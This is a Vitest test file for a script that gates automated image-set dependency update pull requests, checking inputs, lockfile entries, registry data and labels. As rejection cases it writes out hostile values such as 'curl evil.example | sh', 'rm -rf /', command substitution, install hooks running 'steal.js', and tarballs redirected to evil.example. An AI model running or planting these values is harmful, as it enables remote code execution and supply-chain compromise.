import {execFileSync, spawnSync} from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {afterEach, beforeEach, describe, expect, it} from 'vitest';
import customConfig from '@/imageset.custom.json';
import imagesetConfig from '@/imageset.config.json';
import {checkPackageEntry, compareVersions, escapedText, parseRegistry, pullRequestBody, TAG_NAME, validateInput, VERSION_PATTERN} from '@/scripts/image-set-update.mjs';

const script = path.resolve(__dirname, '../../../scripts/image-set-update.mjs');

describe('validateInput', () => {
  it('returns {packageName, version, same} when the package is an official set and the version is x.y.z', () => {
    expect(validateInput('image-overwatch', '1.3.0', customConfig, '1.2.0')).toEqual({packageName: 'image-overwatch', version: '1.3.0', same: false});
    expect(validateInput('image-reachthefinals', '10.0.0', customConfig, '1.3.0').same).toBe(false);
    expect(validateInput('image-overwatch', '1.2.0', customConfig, '1.2.0').same).toBe(true);
  });

  it.each([
    ['an unknown package', 'image-unknown', 'is not an official image set'],
    ['a legacy set', 'image-supervive', 'is not an official image set'],
    ['the template package', 'image-set', 'is not an official image set'],
    ['a package outside the image sets', 'left-pad', 'is not an image set name'],
    ['a scoped package', '@evil/image-overwatch', 'is not an image set name'],
    ['shell metacharacters', 'image-overwatch; curl evil.example | sh', 'is not an image set name'],
    ['command substitution', 'image-$(id)', 'is not an image set name'],
    ['backticks', 'image-`id`', 'is not an image set name'],
    ['a newline', 'image-overwatch\nimage-reachthefinals', 'is not an image set name'],
    ['a version after the name', 'image-overwatch@1.3.0', 'is not an image set name'],
    ['a very long name', `image-${'a'.repeat(80)}`, 'is not an image set name'],
    ['nothing', '', 'No package name'],
    ['a number', 42, 'No package name'],
  ])('throws when the package is %s', (_name, packageName, message) => {
    expect(() => validateInput(packageName, '1.3.0', customConfig)).toThrow(message);
  });

  it.each([
    ['a "+" build suffix', '1.3.0+build.5'],
    ['a pre-release', '1.3.0-beta.1'],
    ['a "v" prefix', 'v1.3.0'],
    ['two parts', '1.3'],
    ['four parts', '1.3.0.1'],
    ['leading zeros', '01.3.0'],
    ['a range', '^1.3.0'],
    ['a tag', 'latest'],
    ['shell metacharacters', '1.3.0; rm -rf /'],
    ['command substitution', '$(touch pwned)'],
    ['a trailing newline', '1.3.0\n'],
    ['a workflow command', '1.3.0\n::error::injected'],
    ['spaces', ' 1.3.0'],
    ['a huge number', '1.3.1234567890'],
    ['nothing', ''],
  ])('throws when the version is %s', (_name, version) => {
    expect(() => validateInput('image-overwatch', version, customConfig)).toThrow(/version/);
  });

  it('throws when the version is older than the one in package.json', () => {
    expect(() => validateInput('image-overwatch', '1.1.9', customConfig, '1.2.0')).toThrow('older than 1.2.0');
  });

  it('throws a one-line message with the quoted value when the version has a workflow command', () => {
    try {
      validateInput('image-overwatch', '1.3.0\n::error::injected', customConfig);
    } catch (error) {
      expect((error as Error).message).not.toContain('\n');
      expect((error as Error).message).toContain('"1.3.0\\n::error::injected"');
    }
  });

  it('returns a numeric order from compareVersions when the version parts have different digit counts', () => {
    expect(compareVersions('1.10.0', '1.9.9')).toBeGreaterThan(0);
    expect(compareVersions('2.0.0', '10.0.0')).toBeLessThan(0);
    expect(compareVersions('1.2.3', '1.2.3')).toBe(0);
    expect(VERSION_PATTERN.test('0.0.0')).toBe(true);
  });
});

/** A small repository shaped like opentierboy, with image-ow 1.0.0 installed. */
const INTEGRITY = (char: string) => `sha512-${char.repeat(86)}==`;
const LOCK_BASE = {
  name: 'app',
  version: '1.0.0',
  lockfileVersion: 3,
  requires: true,
  packages: {
    '': {name: 'app', version: '1.0.0', dependencies: {'image-ow': '1.0.0', 'lz-string': '1.5.0'}, devDependencies: {eslint: '9.0.0'}},
    'node_modules/image-ow': {version: '1.0.0', resolved: 'https://registry.npmjs.org/image-ow/-/image-ow-1.0.0.tgz', integrity: INTEGRITY('a'), dependencies: {prompts: '^5.0.0'}},
    'node_modules/prompts': {version: '5.0.0', resolved: 'https://registry.npmjs.org/prompts/-/prompts-5.0.0.tgz', integrity: INTEGRITY('b'), dependencies: {chalk: '^4'}},
    'node_modules/chalk': {version: '4.0.0', resolved: 'https://registry.npmjs.org/chalk/-/chalk-4.0.0.tgz', integrity: INTEGRITY('c')},
    'node_modules/lz-string': {version: '1.5.0', resolved: 'https://registry.npmjs.org/lz-string/-/lz-string-1.5.0.tgz', integrity: INTEGRITY('d')},
    'node_modules/eslint': {version: '9.0.0', resolved: 'https://registry.npmjs.org/eslint/-/eslint-9.0.0.tgz', integrity: INTEGRITY('e'), dev: true, dependencies: {chalk: '^4'}},
  },
};
const image = (filename: string, label: string, tags: string[] = ['heroes']) => ({filename, label, tags});
/** What `npm view image-ow@1.1.0 dist.integrity scripts bin dependencies gypfile --json` answers. */
const REGISTRY = {'dist.integrity': INTEGRITY('f'), scripts: {test: 'jest'}};
const CONFIG_BASE = {
  packages: {
    'image-old': {displayName: 'Old', images: [image('x.webp', 'X')], tags: {heroes: {title: 'Heroes', description: 'Heroes', category: 'general'}}, legacy: true},
    'image-ow': {
      displayName: 'OW',
      images: [image('ana.webp', 'Ana'), image('mei.webp', 'Mei')],
      tags: {heroes: {title: 'Heroes', description: 'Heroes', category: 'general'}},
      googleFont: 'Saira',
      backgroundImage: '/splash/ow-bg.webp',
    },
  },
};
const registry = (config: typeof CONFIG_BASE) => Object.fromEntries(Object.entries(config.packages).flatMap(([name, set]) => (
  set.images.map((img) => [`${name}-${img.filename}`, {package: name, filename: img.filename, label: img.label}])
)));

describe('scripts/image-set-update.mjs', () => {
  let repo: string;

  const git = (...args: string[]) => execFileSync('git', ['-c', 'user.name=Test', '-c', 'user.email=test@example.com', '-c', 'commit.gpgsign=false', ...args], {cwd: repo, encoding: 'utf8'});
  const write = (file: string, value: unknown) => {
    fs.mkdirSync(path.dirname(path.join(repo, file)), {recursive: true});
    fs.writeFileSync(path.join(repo, file), typeof value === 'string' || Buffer.isBuffer(value) ? value : JSON.stringify(value, null, 2) + '\n');
  };
  const run = (command: string, env: Record<string, string>, ...args: string[]) => {
    const result = spawnSync(process.execPath, [script, command, ...args], {cwd: repo, encoding: 'utf8', env: {...process.env, ...env, GITHUB_OUTPUT: path.join(repo, '.output')}});
    return {status: result.status, output: `${result.stdout}${result.stderr}`};
  };
  /** The npm view answer the next gate() call gets; a scenario may replace it. */
  let registryAnswer: unknown;
  const gate = (version = '1.1.0', registry: unknown = registryAnswer) => {
    write('.registry.json', typeof registry === 'string' ? registry : JSON.stringify(registry));
    return run('gate', {PACKAGE: 'image-ow', VERSION: version}, '--registry', path.join(repo, '.registry.json'), '--body', path.join(repo, '.body.md'));
  };
  /** Changes the staged lockfile entry of image-ow (after stageUpdate). */
  const editLockEntry = (edit: (entry: Record<string, any>) => void) => {
    const lock = JSON.parse(fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8'));
    edit(lock.packages['node_modules/image-ow']);
    write('package-lock.json', lock);
    git('add', 'package-lock.json');
  };
  /** Renames the tag "heroes" of image-ow in the staged config (after stageUpdate). */
  const renameTag = (name: string) => editEntry((entry) => {
    Object.defineProperty(entry.tags, name, {value: entry.tags.heroes, enumerable: true, configurable: true, writable: true});
    delete entry.tags.heroes;
    for (const img of entry.images) img.tags = img.tags.map((tag: string) => (tag === 'heroes' ? name : tag));
  });

  /** Stages what `npm install image-ow@1.1.0` and prepareImages would change: one new image, one new label. */
  const stageUpdate = (change: {config?: typeof CONFIG_BASE; lock?: typeof LOCK_BASE} = {}) => {
    const pkg = JSON.parse(fs.readFileSync(path.join(repo, 'package.json'), 'utf8'));
    pkg.dependencies['image-ow'] = '1.1.0';
    write('package.json', pkg);
    const lock = change.lock ?? structuredClone(LOCK_BASE);
    if (!change.lock) {
      lock.packages[''].dependencies['image-ow'] = '1.1.0';
      lock.packages['node_modules/image-ow'] = {version: '1.1.0', resolved: 'https://registry.npmjs.org/image-ow/-/image-ow-1.1.0.tgz', integrity: INTEGRITY('f')} as never;
      delete (lock.packages as Record<string, unknown>)['node_modules/prompts'];
      // chalk stays, needed by eslint only now: npm marks it dev.
      (lock.packages['node_modules/chalk'] as Record<string, unknown>).dev = true;
    }
    write('package-lock.json', lock);
    const config = change.config ?? structuredClone(CONFIG_BASE);
    if (!change.config) {
      config.packages['image-ow'].images[1].label = 'Mei-Ling';
      config.packages['image-ow'].images.push(image('heroes/wuyang.webp', 'Wuyang'));
    }
    write('imageset.config.json', JSON.stringify(config, null, 2));
    write('image-registry.lock.json', {...registry(CONFIG_BASE), ...Object.fromEntries(Object.entries(registry(config)).filter(([id]) => !(id in registry(CONFIG_BASE))))});
    git('add', '-A', '--', 'package.json', 'package-lock.json', 'imageset.config.json', 'image-registry.lock.json', 'image-aliases.json');
  };

  /** Changes the staged imageset.config.json entry of image-ow (after stageUpdate). */
  const editEntry = (edit: (entry: Record<string, any>) => void) => {
    const config = JSON.parse(fs.readFileSync(path.join(repo, 'imageset.config.json'), 'utf8'));
    edit(config.packages['image-ow']);
    write('imageset.config.json', JSON.stringify(config, null, 2));
    git('add', 'imageset.config.json');
  };

  beforeEach(() => {
    registryAnswer = structuredClone(REGISTRY);
    repo = fs.mkdtempSync(path.join(os.tmpdir(), 'otb-image-set-update-'));
    git('init', '-q', '-b', 'main');
    write('package.json', {name: 'app', version: '1.0.0', dependencies: {'image-ow': '1.0.0', 'lz-string': '1.5.0'}, devDependencies: {eslint: '9.0.0'}});
    write('package-lock.json', LOCK_BASE);
    write('imageset.custom.json', {packages: {'image-old': {legacy: true}, 'image-ow': {displayName: 'OW', googleFont: 'Saira', backgroundImage: '/splash/ow-bg.webp'}}});
    write('imageset.legacy.json', {'image-old': CONFIG_BASE.packages['image-old']});
    write('imageset.config.json', JSON.stringify(CONFIG_BASE, null, 2));
    write('image-registry.lock.json', registry(CONFIG_BASE));
    write('image-aliases.json', {});
    write('README.md', 'app\n');
    git('add', '-A');
    git('commit', '-q', '-m', 'base');
  });

  afterEach(() => {
    fs.rmSync(repo, {recursive: true, force: true});
  });

  describe('scripts/image-set-update.mjs validate', () => {
    it('writes package, version and same=false to $GITHUB_OUTPUT when the version is new', () => {
      const result = run('validate', {PACKAGE: 'image-ow', VERSION: '1.1.0'});
      expect(result.status).toBe(0);
      expect(fs.readFileSync(path.join(repo, '.output'), 'utf8')).toBe('package=image-ow\nversion=1.1.0\nsame=false\n');
    });

    it('writes same=true to $GITHUB_OUTPUT and Nothing to update when package.json has the version', () => {
      const result = run('validate', {PACKAGE: 'image-ow', VERSION: '1.0.0'});
      expect(result.status).toBe(0);
      expect(result.output).toContain('Nothing to update');
      expect(fs.readFileSync(path.join(repo, '.output'), 'utf8')).toContain('same=true');
    });

    it.each([
      ['an unknown package', {PACKAGE: 'image-nope', VERSION: '1.1.0'}],
      ['a legacy package', {PACKAGE: 'image-old', VERSION: '1.1.0'}],
      ['shell metacharacters', {PACKAGE: 'image-ow;id', VERSION: '1.1.0'}],
      ['a non-semver version', {PACKAGE: 'image-ow', VERSION: '1.1'}],
      ['a "+" build suffix', {PACKAGE: 'image-ow', VERSION: '1.1.0+b1'}],
      ['a downgrade', {PACKAGE: 'image-ow', VERSION: '0.9.0'}],
      ['no values', {PACKAGE: '', VERSION: ''}],
    ])('returns exit code 1 and writes no $GITHUB_OUTPUT file when the input has %s', (_name, env) => {
      const result = run('validate', env);
      expect(result.status).toBe(1);
      expect(result.output).toContain('refused:');
      expect(fs.existsSync(path.join(repo, '.output'))).toBe(false);
      expect(result.output.split('\n').some((line) => line.startsWith('::'))).toBe(false);
    });

    it('returns exit code 1 when only the uncommitted imageset.custom.json lists the package', () => {
      write('imageset.custom.json', {packages: {'image-old': {legacy: true}, 'image-ow': {}, 'image-evil': {}}});
      expect(run('validate', {PACKAGE: 'image-evil', VERSION: '1.0.0'}).status).toBe(1);
    });
  });

  describe('scripts/image-set-update.mjs gate', () => {
    it('writes the pull request body with added ids, changed labels and lockfile changes when the update is valid', () => {
      stageUpdate();
      const result = gate();
      expect(result.output).toContain('changes nothing else');
      expect(result.status).toBe(0);
      const body = fs.readFileSync(path.join(repo, '.body.md'), 'utf8');
      expect(body).toContain('### Added item ids (1)\n\n- `image-ow-heroes/wuyang.webp`');
      expect(body).toContain('### Changed labels (1)');
      expect(body).toContain('`image-ow-mei.webp`: `Mei` → `Mei-Ling`');
      expect(body).toContain('### New aliases (0)\n\n- none');
      expect(body).toContain('### Packages removed from package-lock.json (1)');
      expect(body).not.toContain('Shapes other than square');
      // New items with their labels; install flags that npm recomputed.
      expect(body).toContain('- `image-ow-heroes/wuyang.webp`: `Wuyang`\n');
      expect(body).toContain('### Install flags changed in package-lock.json (1)');
      expect(body).toContain('- `node_modules/chalk`: none → `dev`');
    });

    it('writes the escaped exact form to the pull request body when a label has look-alike letters or accents', () => {
      const config = structuredClone(CONFIG_BASE);
      config.packages['image-ow'].images[0].label = '\u0410na'; // Cyrillic А, looks like "Ana"
      config.packages['image-ow'].images.push(image('lucio.webp', 'Lúcio'));
      stageUpdate({config});
      const result = gate();
      expect(result.output).toContain('changes nothing else');
      expect(result.status).toBe(0);
      const body = fs.readFileSync(path.join(repo, '.body.md'), 'utf8');
      expect(body).toContain('- `image-ow-ana.webp`: `Ana` → `\u0410na` (exact: `"Ana"` → `"\\u0410na"`)');
      expect(body).toContain('- `image-ow-lucio.webp`: `Lúcio` (exact: `"L\\u00facio"`)');
    });

    it('returns exit code 0 when the lockfile entry has license, engines and funding', () => {
      stageUpdate();
      editLockEntry((entry) => {
        entry.license = 'CC-BY-SA-4.0';
        entry.engines = {node: '>=18'};
        entry.funding = {url: 'https://example.com/fund'};
      });
      const result = gate();
      expect(result.output).toContain('changes nothing else');
      expect(result.status).toBe(0);
    });

    it('returns exit code 0 when the npm view answer is only the bare integrity string', () => {
      stageUpdate();
      const result = gate('1.1.0', JSON.stringify(INTEGRITY('f')));
      expect(result.output).toContain('changes nothing else');
      expect(result.status).toBe(0);
    });

    it.each([
      ['no answer at all', '', 'npm view gave no answer'],
      ['an answer that is not JSON', 'npm error 404', 'The npm view answer is not JSON'],
      ['the error object of npm view --json', JSON.stringify({error: {code: 'E404'}}), 'unexpected fields "error"'],
      ['an answer without integrity', JSON.stringify({scripts: {}}), 'no sha512 dist.integrity'],
      ['a huge answer', JSON.stringify({...REGISTRY, scripts: {test: 'x'.repeat(300 * 1024)}}), 'larger than 262144 bytes'],
    ])('returns exit code 1 when the --registry file contains %s', (_name, answer, message) => {
      stageUpdate();
      const result = gate('1.1.0', answer);
      expect(result.output).toContain(message);
      expect(result.status).toBe(1);
    });

    it('returns exit code 1 when --registry is missing', () => {
      stageUpdate();
      const result = run('gate', {PACKAGE: 'image-ow', VERSION: '1.1.0'}, '--body', path.join(repo, '.body.md'));
      expect(result.output).toContain('Pass the npm view answer with --registry <file>');
      expect(result.status).toBe(1);
    });

    it('returns exit code 0 when an alias maps a removed id to an id the update adds', () => {
      const config = structuredClone(CONFIG_BASE);
      config.packages['image-ow'].images[1] = image('mei-v2.webp', 'Mei');
      stageUpdate({config});
      write('image-aliases.json', {'image-ow-mei.webp': 'image-ow-mei-v2.webp'});
      git('add', 'image-aliases.json');
      const result = gate();
      expect(result.output).toContain('changes nothing else');
      expect(result.status).toBe(0);
      expect(fs.readFileSync(path.join(repo, '.body.md'), 'utf8')).toContain('`image-ow-mei.webp` → `image-ow-mei-v2.webp`');
    });

    it('writes a do-not-merge warning to the pull request body when an image shape is not square', () => {
      const config = structuredClone(CONFIG_BASE);
      (config.packages['image-ow'].images[0] as Record<string, unknown>).shape = 'portrait';
      stageUpdate({config});
      expect(gate().status).toBe(0);
      expect(fs.readFileSync(path.join(repo, '.body.md'), 'utf8')).toContain('**Do not merge before the drag and drop update (revamp Phase 5e).**');
    });

    const refusals: [string, () => void, string][] = [
      ['a change to another file', () => {
        write('README.md', 'changed\n');
        git('add', 'README.md');
      }, 'README.md: an image set update may not change this file'],
      ['a new workflow file', () => {
        write('.github/workflows/x.yml', 'on: push\n');
        git('add', '.github');
      }, '.github/workflows/x.yml: an image set update may not change this file'],
      ['a deleted file', () => git('rm', '-q', 'README.md'), 'README.md: change type D is not allowed'],
      ['another dependency in package.json', () => {
        const pkg = JSON.parse(fs.readFileSync(path.join(repo, 'package.json'), 'utf8'));
        pkg.dependencies['lz-string'] = '1.5.1';
        write('package.json', pkg);
        git('add', 'package.json');
      }, 'package.json: only dependencies.image-ow may change'],
      ['an npm script in package.json', () => {
        const pkg = JSON.parse(fs.readFileSync(path.join(repo, 'package.json'), 'utf8'));
        pkg.scripts = {postinstall: 'curl evil.example | sh'};
        write('package.json', pkg);
        git('add', 'package.json');
      }, 'package.json: only dependencies.image-ow may change'],
      ['a package added to package-lock.json', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8'));
        lock.packages['node_modules/evil'] = {version: '1.0.0', resolved: 'https://registry.npmjs.org/evil/-/evil-1.0.0.tgz', integrity: INTEGRITY('z')};
        write('package-lock.json', lock);
        git('add', 'package-lock.json');
      }, 'package-lock.json: adds node_modules/evil'],
      ['a changed tarball of another package', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8'));
        lock.packages['node_modules/lz-string'].resolved = 'https://evil.example/lz-string.tgz';
        write('package-lock.json', lock);
        git('add', 'package-lock.json');
      }, 'package-lock.json: changes node_modules/lz-string'],
      ['the package from another place than the npm registry', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8'));
        lock.packages['node_modules/image-ow'].resolved = 'https://evil.example/image-ow-1.1.0.tgz';
        write('package-lock.json', lock);
        git('add', 'package-lock.json');
      }, 'must come from https://registry.npmjs.org/image-ow/-/image-ow-1.1.0.tgz'],
      ['an install script in the package', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8'));
        lock.packages['node_modules/image-ow'].hasInstallScript = true;
        write('package-lock.json', lock);
        git('add', 'package-lock.json');
      }, 'node_modules/image-ow has keys an image set must not have: "hasInstallScript"'],
      ['a change to another image set', () => {
        const config = JSON.parse(fs.readFileSync(path.join(repo, 'imageset.config.json'), 'utf8'));
        config.packages['image-old'].images[0].label = 'Changed';
        write('imageset.config.json', config);
        git('add', 'imageset.config.json');
      }, 'imageset.config.json: image-old changed'],
      ['a removed registry entry', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'image-registry.lock.json'), 'utf8'));
        delete lock['image-old-x.webp'];
        write('image-registry.lock.json', lock);
        git('add', 'image-registry.lock.json');
      }, 'image-registry.lock.json: image-old-x.webp was removed'],
      ['an alias to an id that shipped before (A32)', () => {
        write('image-aliases.json', {'image-ow-mei.webp': 'image-ow-ana.webp'});
        git('add', 'image-aliases.json');
      }, 'An alias target must be a new id added in the same change'],
      ['a symbolic link', () => {
        fs.symlinkSync('/etc/passwd', path.join(repo, 'public-link'));
        git('add', 'public-link');
      }, 'public-link: mode 120000 is not allowed'],
      ['a background image from another site (it loads on the landing page)', () => editEntry((entry) => {
        entry.backgroundImage = 'https://tracker.example/pixel.gif';
      }), 'imageset.config.json: image-ow: backgroundImage is "https://tracker.example/pixel.gif", but imageset.custom.json at HEAD gives "/splash/ow-bg.webp"'],
      ['a changed display name (the URL slug of shared links)', () => editEntry((entry) => {
        entry.displayName = 'Overwatch 2';
      }), 'imageset.config.json: image-ow: displayName is "Overwatch 2", but imageset.custom.json at HEAD gives "OW"'],
      ['a changed font', () => editEntry((entry) => {
        entry.googleFont = 'Comic Neue';
      }), 'imageset.config.json: image-ow: googleFont is "Comic Neue", but imageset.custom.json at HEAD gives "Saira"'],
      ['a removed font', () => editEntry((entry) => {
        delete entry.googleFont;
      }), 'imageset.config.json: image-ow: googleFont is nothing, but imageset.custom.json at HEAD gives "Saira"'],
      ['an unknown key in the entry', () => editEntry((entry) => {
        entry.homepage = 'https://evil.example';
      }), 'imageset.config.json: image-ow has unknown keys "homepage"'],
      ['an unknown key in an image', () => editEntry((entry) => {
        entry.images[0].href = 'https://evil.example';
      }), 'imageset.config.json: image-ow: image "ana.webp" has unknown keys "href"'],
      ['an unknown key in a tag', () => editEntry((entry) => {
        entry.tags.heroes.link = 'https://evil.example';
      }), 'imageset.config.json: image-ow: tag "heroes" has unknown keys "link"'],
      ['the legacy flag', () => editEntry((entry) => {
        entry.legacy = true;
      }), 'imageset.config.json: image-ow must not be marked legacy'],
      ['a duplicate image (duplicate drag ids)', () => editEntry((entry) => {
        entry.images.push({...entry.images[0]});
      }), 'imageset.config.json: image-ow: image "ana.webp" is listed twice'],
      ['an unknown image shape', () => editEntry((entry) => {
        entry.images[0].shape = 'circle';
      }), 'imageset.config.json: image-ow: image "ana.webp": unknown shape "circle" (allowed: square, landscape, portrait)'],
      ['an unknown tag shape', () => editEntry((entry) => {
        entry.tags.heroes.shape = 'hexagon';
      }), 'imageset.config.json: image-ow: tag "heroes": unknown shape "hexagon"'],
      ['a stored square shape (the default is never stored)', () => editEntry((entry) => {
        entry.images[0].shape = 'square';
      }), 'image "ana.webp": shape "square" is the default and is never stored'],
      ['an image tag that the set does not list', () => editEntry((entry) => {
        entry.images[0].tags = ['heroes', 'ghost'];
      }), 'image "ana.webp": tag "ghost" is not in the tags of image-ow'],
      ['a tag without images', () => editEntry((entry) => {
        entry.tags.empty = {title: 'Empty', description: 'Empty', category: 'general'};
      }), 'imageset.config.json: image-ow: tag "empty" has no images'],
      ['an empty label', () => editEntry((entry) => {
        entry.images[0].label = '';
      }), 'image "ana.webp": label must be a non-empty string'],
      ['a tag title that is not text', () => editEntry((entry) => {
        entry.tags.heroes.title = {html: '<b>Heroes</b>'};
      }), 'tag "heroes": title must be a non-empty string'],
      // The lockfile entry against the registry (job 1 ran the package's code and wrote it).
      ['a lockfile integrity that the registry does not give', () => {
        registryAnswer = {...REGISTRY, 'dist.integrity': INTEGRITY('g')};
      }, 'package-lock.json: node_modules/image-ow has another integrity than the registry gives for image-ow@1.1.0'],
      ...['preinstall', 'install', 'postinstall'].map((script): [string, () => void, string] => [`a published ${script} script that the lockfile hides`, () => {
        registryAnswer = {...REGISTRY, scripts: {test: 'jest', [script]: 'node steal.js'}};
      }, `The published image-ow@1.1.0 has a "${script}" script`]),
      ['a published gypfile', () => {
        registryAnswer = {...REGISTRY, gypfile: true};
      }, 'The published image-ow@1.1.0 has a gypfile'],
      ['a published bin', () => {
        registryAnswer = {...REGISTRY, bin: {'image-ow': 'cli.js'}};
      }, 'The published image-ow@1.1.0 has a bin'],
      ['lockfile dependencies that the registry does not give', () => editLockEntry((entry) => {
        entry.dependencies = {chalk: '^4'};
      }), 'package-lock.json: the dependencies of node_modules/image-ow differ from the ones the registry gives for image-ow@1.1.0'],
      ['published dependencies that the lockfile entry leaves out', () => {
        registryAnswer = {...REGISTRY, dependencies: {chalk: '^4'}};
      }, 'the dependencies of node_modules/image-ow differ from the ones the registry gives'],
      ['an "os" key in the lockfile entry', () => editLockEntry((entry) => {
        entry.os = ['linux'];
      }), 'node_modules/image-ow has keys an image set must not have: "os"'],
      ['a "bin" key in the lockfile entry', () => editLockEntry((entry) => {
        entry.bin = {x: 'x.js'};
      }), 'node_modules/image-ow has keys an image set must not have: "bin"'],
      ['an own "__proto__" key in the lockfile entry', () => {
        const text = fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8')
          .replace('"node_modules/image-ow": {', '"node_modules/image-ow": {"__proto__": {"hasInstallScript": true},');
        write('package-lock.json', text);
        git('add', 'package-lock.json');
      }, 'node_modules/image-ow has keys an image set must not have: "__proto__"'],
      ['a changed dev flag on a direct dependency', () => {
        const lock = JSON.parse(fs.readFileSync(path.join(repo, 'package-lock.json'), 'utf8'));
        lock.packages['node_modules/lz-string'].dev = true;
        write('package-lock.json', lock);
        git('add', 'package-lock.json');
      }, 'package-lock.json: changes the dev/optional flags of node_modules/lz-string, a direct dependency'],
      ['a dev flag on the package itself', () => editLockEntry((entry) => {
        entry.optional = true;
      }), 'node_modules/image-ow has keys an image set must not have: "optional"'],
      // Labels and tag texts.
      ['a bidi control in a label', () => editEntry((entry) => {
        entry.images[0].label = 'Ana\u202Egnp.exe';
      }), 'image "ana.webp": label has a control or invisible formatting character: "Ana\\u202egnp.exe"'],
      ['a zero-width space in a tag title', () => editEntry((entry) => {
        entry.tags.heroes.title = 'Her\u200Boes';
      }), 'tag "heroes": title has a control or invisible formatting character'],
      ['a trailing space in a label', () => editEntry((entry) => {
        entry.images[0].label = 'Ana ';
      }), 'image "ana.webp": label starts or ends with a space'],
      ['a leading space in a tag category', () => editEntry((entry) => {
        entry.tags.heroes.category = ' general';
      }), 'tag "heroes": category starts or ends with a space'],
      ['a label longer than 100 characters', () => editEntry((entry) => {
        entry.images[0].label = 'A'.repeat(101);
      }), 'image "ana.webp": label is longer than 100 characters'],
      ['a tag description longer than 200 characters', () => editEntry((entry) => {
        entry.tags.heroes.description = 'é'.repeat(201);
      }), 'tag "heroes": description is longer than 200 characters'],
      // Tag names.
      ...['all', '__proto__', 'constructor', 'prototype', 'two words', 'x'.repeat(65), 'héroes'].map((name): [string, () => void, string] => [`a tag named ${JSON.stringify(name.length > 20 ? `${name.slice(0, 8)}... (${name.length})` : name)}`, () => renameTag(name),
        `tag ${JSON.stringify(name.length > 64 ? `${name.slice(0, 64)}...` : name)}: a tag name is 1 to 64 letters, digits, "_" or "-"`]),
      // URL forms of tags: /rank/<set>/<tag> opens the first tag whose URL form matches.
      ['a tag whose URL form takes over another tag\'s page (h-all before h_all)', () => editEntry((entry) => {
        const heroes = entry.tags.heroes;
        entry.tags = {'h-all': {title: 'Takeover', description: 'Takeover', category: 'general'}, h_all: heroes};
        for (const img of entry.images) img.tags = img.tags.map((tag: string) => (tag === 'heroes' ? 'h_all' : tag));
        entry.images[0].tags.push('h-all');
      }), 'tag "h_all": its URL form "h-all" is the same as tag "h-all"\'s, so /rank/<set>/h-all opens only one of them'],
      ['a tag that "all" hides (ALL, a reserved name in capitals)', () => renameTag('ALL'), 'tag "ALL": a tag name is 1 to 64 letters, digits, "_" or "-", and not all'],
      ['a tag that "all" hides (_all_)', () => renameTag('_all_'), 'tag "_all_": its URL form is "all", which always opens every item'],
      ['a tag with an empty URL form (_)', () => renameTag('_'), 'tag "_": its URL form is empty'],
      ['a tag with an empty URL form (-)', () => renameTag('-'), 'tag "-": its URL form is empty'],
      ...['Constructor', '__PROTO__', 'PROTOTYPE', 'All'].map((name): [string, () => void, string] => [`the reserved tag name ${name} in another letter case`, () => renameTag(name),
        `tag "${name}": a tag name is 1 to 64 letters, digits, "_" or "-", and not all, __proto__, constructor, prototype (in any letter case)`]),
      // Filenames.
      ['a new filename that differs from an old one only in letter case', () => editEntry((entry) => {
        entry.images.push(image('Ana.webp', 'Ana again'));
      }), 'new image "Ana.webp" differs only in letter case from "ana.webp"'],
      ['two new filenames that differ only in letter case', () => editEntry((entry) => {
        entry.images.push(image('x/one.webp', 'One'), image('X/One.webp', 'One again'));
      }), 'new image "X/One.webp" differs only in letter case from "x/one.webp"'],
      // Size.
      ['more than 2,000 new images', () => editEntry((entry) => {
        for (let index = 0; index < 2001; index++) entry.images.push(image(`bulk/${index}.webp`, `Bulk ${index}`));
      }), 'this update adds 2002 images; at most 2000 new images per update are accepted'],
      ['an image in the set\'s folder (official sets are never committed)', () => {
        write('public/images/image-ow/x.png', Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex'));
        git('add', '-f', 'public');
      }, 'public/images/image-ow/x.png: an image set update may not change this file'],
    ];
    it.each(refusals)('returns exit code 1 when the update has %s', (_name, change, message) => {
      stageUpdate();
      change();
      const result = gate();
      expect(result.output).toContain(message);
      expect(result.status).toBe(1);
    });

    it('returns exit code 1 when the update adds an image file to a committed public/images folder', () => {
      write('public/images/image-ow/ana.webp', Buffer.from('RIFF\0\0\0\0WEBPVP8 '));
      git('add', '-f', 'public');
      git('commit', '-q', '-m', 'commit the image folder');
      stageUpdate();
      write('public/images/image-ow/new.webp', Buffer.from('RIFF\0\0\0\0WEBPVP8 '));
      git('add', '-f', 'public');
      const result = gate();
      expect(result.output).toContain('public/images/image-ow/new.webp: an image set update may not change this file');
      expect(result.status).toBe(1);
    });

    it('writes the moved items and changed categories to the pull request body when items change categories', () => {
      const config = structuredClone(CONFIG_BASE);
      const entry = config.packages['image-ow'] as Record<string, any>;
      entry.images[0].tags = ['support'];
      entry.tags.heroes.title = 'All heroes';
      entry.tags.support = {title: 'Support', description: 'Support heroes', category: 'role'};
      stageUpdate({config});
      const result = gate();
      expect(result.output).toContain('changes nothing else');
      expect(result.status).toBe(0);
      const body = fs.readFileSync(path.join(repo, '.body.md'), 'utf8');
      expect(body).toContain('### Items that changed categories (1)');
      expect(body).toContain('- `image-ow-ana.webp`: `heroes` → `support`');
      expect(body).toContain('### New, removed or changed categories (2)');
      expect(body).toContain('- `support`: new, `Support`');
      expect(body).toContain('- `heroes`: title `Heroes` → `All heroes`');
    });

    it('returns exit code 1 when a shipped id is removed without an alias', () => {
      const config = structuredClone(CONFIG_BASE);
      config.packages['image-ow'].images.pop();
      stageUpdate({config});
      const result = gate();
      expect(result.output).toContain('image-ow-mei.webp was shipped and is gone');
      expect(result.status).toBe(1);
    });

    it('returns exit code 1 when the patch leaves the version in package.json unchanged', () => {
      const config = structuredClone(CONFIG_BASE);
      config.packages['image-ow'].images[0].label = 'Ana 2';
      write('imageset.config.json', JSON.stringify(config, null, 2));
      git('add', 'imageset.config.json');
      const result = gate();
      expect(result.output).toContain('package.json: dependencies.image-ow must be exactly 1.1.0');
      expect(result.status).toBe(1);
    });

    it('returns exit code 1 when the patch is empty', () => {
      const result = gate();
      expect(result.output).toContain('The patch changes nothing');
      expect(result.status).toBe(1);
    });
  });

